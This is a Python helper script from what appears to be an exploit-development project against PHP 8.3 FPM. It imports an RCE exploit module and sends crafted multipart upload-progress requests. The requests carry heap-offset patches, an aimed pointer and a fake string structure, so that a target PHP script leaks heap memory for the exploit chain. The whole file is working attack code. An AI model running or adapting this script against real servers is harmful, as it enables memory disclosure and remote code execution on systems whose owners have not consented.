#!/usr/bin/env python3
"""Send R3 at a chosen heap offset and keep body-leak.php alive for inspection."""

from __future__ import annotations

import argparse
import struct
import sys
from pathlib import Path


sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "exploits"))
import php8321_fpm_rce as p  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, type=lambda value: int(value, 0))
    parser.add_argument("--length", type=lambda value: int(value, 0), default=0x1000)
    parser.add_argument("--path", default="/body-leak.php?hold=60")
    parser.add_argument(
        "--pre-file",
        action="store_true",
        help="insert a completed nested upload before enabling upload progress",
    )
    parser.add_argument(
        "--body-leak-layout",
        action="store_true",
        help="use the measured parser-copy offsets for /body-leak.php?hold=0",
    )
    parser.add_argument(
        "--phpinfo-layout",
        action="store_true",
        help="use the measured parser-copy offsets for /_profiler/phpinfo",
    )
    args = parser.parse_args()

    if args.body_leak_layout or args.phpinfo_layout:
        # The longer SCRIPT_FILENAME creates three BIG copies. Pick, for each
        # stale block, the first measured copy that covers its current offset.
        # This also handles the alternate E=0xbf000 layout observed after an
        # additional re-arm.
        filler = bytearray(b"A" * p.FILLER)
        copy_bases = (
            (0x65000, 0x86018, 0xB6018)
            if args.phpinfo_layout
            else (0x74000, 0x95018, 0xB6018)
        )

        def body_offset(target: int) -> int:
            for base in copy_bases:
                if base <= target < base + p.FILLER:
                    return target - base
            raise SystemExit(f"no measured BIG copy covers target {target:#x}")

        e_body = body_offset(p.E_OFF)
        dt_body = body_offset(p.DT_OFF)
        body_patches = [
            (e_body, struct.pack("<q", p.aim(args.target))),
            (dt_body, struct.pack("<q", 0)),
            (dt_body + p.FAKE_STR_OFF + 0x10, struct.pack("<Q", args.length)),
            (dt_body + p.FAKE_STR_OFF + 0x18, b"P2S-FAKE-STRING\x00"),
        ]
        for offset, value in body_patches:
            filler[offset:offset + len(value)] = value
        parts = [("BIG", bytes(filler), None)]
        if args.pre_file:
            parts.append(("pre[]", b"Z", b"pre.bin"))
        parts += [
            ("PHP_SESSION_UPLOAD_PROGRESS", b"K3", None),
            ("f", b"Z", b"a.bin"),
        ]
        status, body = p.post(parts, p.SID_REC, args.path)
    else:
        patches = [
            (p.E_OFF, struct.pack("<q", p.aim(args.target))),
            (p.DT_OFF, struct.pack("<q", 0)),
            (p.DT_OFF + p.FAKE_STR_OFF + 0x10, struct.pack("<Q", args.length)),
            (p.DT_OFF + p.FAKE_STR_OFF + 0x18, b"P2S-FAKE-STRING\x00"),
        ]
        status, body = p.decode_request(p.SID_REC, b"K3", patches, path=args.path)
    print(f"status={status} bytes={len(body)}")
    Path("artifacts/body-leak-r3.response").write_bytes(body)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
